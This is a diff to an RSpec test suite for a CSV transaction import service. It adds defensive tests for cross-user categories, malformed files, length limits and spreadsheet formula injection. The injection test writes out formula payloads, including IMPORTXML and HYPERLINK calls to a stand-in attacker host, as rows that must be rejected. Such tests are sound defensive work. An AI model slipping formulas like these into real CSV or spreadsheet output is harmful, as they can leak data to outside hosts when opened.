@@ -117,6 +117,58 @@ RSpec.describe Transactions::ImportCsv, type: :service do
       end
     end
 
+    context "with a category from another user" do
+      let!(:other_category) { create(:category, user: create(:user), name: "Private Other Category") }
+
+      it "does not attach imported transactions to foreign categories" do
+        bad_csv = csv_file(<<~CSV)
+          date,description,amount,type,account_id,category
+          #{Date.current},Should fail,100.00,expense,#{account.id},Private Other Category
+        CSV
+        result = service.call(file: bad_csv, user: user)
+        expect(result[:errors]).not_to be_empty
+        expect(result[:imported]).to eq(0)
+        expect(Transaction.find_by(description: "Should fail")).to be_nil
+      end
+    end
+
+    context "with missing required headers" do
+      it "raises a format error" do
+        bad_file = csv_file("description,amount\nAlmoço,35.50\n")
+        expect {
+          service.call(file: bad_file, user: user)
+        }.to raise_error(Transactions::ImportCsv::InvalidFormatError)
+      end
+    end
+
+    context "with spreadsheet formula injection content" do
+      it "rejects rows whose description starts with a formula prefix" do
+        bad_csv = csv_file(<<~CSV)
+          date,description,amount,type,account_id,category
+          #{Date.current},=IMPORTXML("https://attacker.test"),100.00,expense,#{account.id},
+          #{Date.current},+1+2,100.00,expense,#{account.id},
+          #{Date.current},-10+20,100.00,expense,#{account.id},
+          #{Date.current},@HYPERLINK("https://attacker.test"),100.00,expense,#{account.id},
+        CSV
+        result = service.call(file: bad_csv, user: user)
+        expect(result[:imported]).to eq(0)
+        expect(result[:errors].length).to eq(4)
+      end
+    end
+
+    context "with a very long description" do
+      it "rejects the row" do
+        long_description = "x" * 501
+        bad_csv = csv_file(<<~CSV)
+          date,description,amount,type,account_id,category
+          #{Date.current},#{long_description},100.00,expense,#{account.id},
+        CSV
+        result = service.call(file: bad_csv, user: user)
+        expect(result[:imported]).to eq(0)
+        expect(result[:errors]).not_to be_empty
+      end
+    end
+
     context "with empty CSV" do
       it "returns zero imported and no errors" do
         empty_csv = csv_file("date,description,amount,type,account_id,category\n")
@@ -129,11 +181,9 @@ RSpec.describe Transactions::ImportCsv, type: :service do
     context "with non-CSV content" do
       it "raises a format error" do
         bad_file = csv_file("This is not a CSV file at all. It's just text.\n")
-        # Depending on implementation: might return 0 imported with errors, or raise
         expect {
           service.call(file: bad_file, user: user)
         }.to raise_error(Transactions::ImportCsv::InvalidFormatError)
-          .or satisfy { |_| true }  # alternative: result[:errors].present?
       end
     end
   end
